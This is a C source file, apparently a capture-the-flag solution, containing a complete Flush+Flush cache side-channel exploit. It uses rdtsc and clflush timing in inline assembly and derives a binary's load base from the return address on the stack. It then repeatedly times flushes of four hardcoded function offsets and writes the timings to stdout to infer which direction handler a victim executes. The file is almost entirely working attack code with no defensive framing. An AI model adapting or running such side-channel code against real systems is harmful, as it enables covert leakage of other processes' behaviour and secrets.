#include <emmintrin.h>
#include <stdarg.h>
#include <stdint.h>
#include <immintrin.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/unistd.h>
#include "utils.h"

#define logh(s, n)print(s); hex((u64)(n)); putchar('\n')
#define logi(s, n)print(s); dec((u64)(n)); putchar('\n')
#define flush(addr)_mm_clflush((const void *)(addr))
#define barrier()_mm_mfence()

__attribute__((naked, noinline))
u64 timing(u64 addr) {
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "mov rsi, rax\n"
        "mov rcx, rdx\n"
        "lfence\n"
        "clflush byte ptr [rdi]\n"
        "mfence\n"
        "rdtsc\n"
        "shl rcx, 0x20\n"
        "shl rdx, 0x20\n"
        "or  rsi, rcx\n"
        "or  rax, rdx\n"
        "sub rax, rsi\n"
        "ret\n"
    );
}

__attribute__((naked, noinline))
u64 nothing() {
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "mov rsi, rax\n"
        "mov rcx, rdx\n"
        "lfence\n"
        "nop\n"
        "mfence\n"
        "rdtsc\n"
        "shl rcx, 0x20\n"
        "shl rdx, 0x20\n"
        "or  rsi, rcx\n"
        "or  rax, rdx\n"
        "sub rax, rsi\n"
        "ret\n"
    );
}

void exploit(u64 *stack, int victim) {
    logh("stack: ", stack);

    u64 retaddr = *(stack + 1);
    u64 filebase = retaddr - 0x12ff;

    logh("filebase: ", filebase);

    volatile u64 *mem = (volatile u64 *)syscall(__NR_mmap, NULL, 0x400000, PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    logh("mem: ", mem);

    u64 offsets[] = { 0x17a0, 0x1660, 0x1530, 0x1400, 0x19e0, 0x18e0, };
    char directions[] = { 'S', 'W', 'D', 'A', };
    u64 offset = filebase + offsets[victim];

    ((void(*)(void))offset)();
    delay(100000);
    for (int i = 0; i < 32; i++) {
        logi("uncached flush time: ", timing(offset) - nothing());
    }

    print("starting testing...\n");
    const int dump = 1 << 12;
    int timings[dump * 4];

    int i = 0;
    while (1) {
        u64 baseline = nothing();
        timings[i+0] = timing(filebase + 0x17a0) - baseline;
        timings[i+1] = timing(filebase + 0x1660) - baseline;
        timings[i+2] = timing(filebase + 0x1530) - baseline;
        timings[i+3] = timing(filebase + 0x1400) - baseline;

        i = (i + 4) % (dump * 4);
        if (i == 0) {
            syscall(1, 1, &timings, sizeof(timings));
        }
    }
}

// we put the main function into the `.entry` section
// and use custom linker script in order to guarantee
// main is run first in the flat binary
void __attribute__((section(".entry"))) main () {
    u64* stack;
    asm volatile(
        "mov %[stack], rsp\n"
        : [stack] "=r" (stack)
    );
    exploit(stack, 3);
    print("[+] exploit done\n");
    exit(7);
}